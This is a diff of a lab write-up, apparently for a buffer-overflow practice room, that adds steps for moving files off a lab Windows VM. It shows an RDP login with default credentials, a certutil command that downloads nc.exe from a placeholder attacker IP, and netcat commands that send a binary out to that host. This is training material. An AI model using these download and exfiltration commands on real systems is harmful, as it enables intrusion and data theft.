@@ -2,7 +2,20 @@ You can log onto the machine using RDP with the following credentials: admin/pas
 ```sh
 xfreerdp /u:admin /p:password /cert:ignore /v:10.10.49.205 /workarea
 ```
+Other options is download files on your machine.
 
+# How To Transfer The Files?
+First, upload our nc.exe on that machine because I can't find nc on the machine,
+
+certutil -urlcache -f http://<IP>/nc.exe c:\Users\admin\Desktop\nc.exe
+Then I just use NC to transfer files. I don't know how to transfer all directory so instead, I just transfer each one inside the vulnerable-apps directory.
+
+#On Our Machine
+nc -l -p 1234 > oscp.exe
+#On Target Machine
+nc.exe -w 3 <IP> 1234 < vulnerable-apps\oscp\oscp.exe
+
+# Other Steps
 If Windows prompts you to choose a location for your network, choose the "Home" option.
 
 On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer 
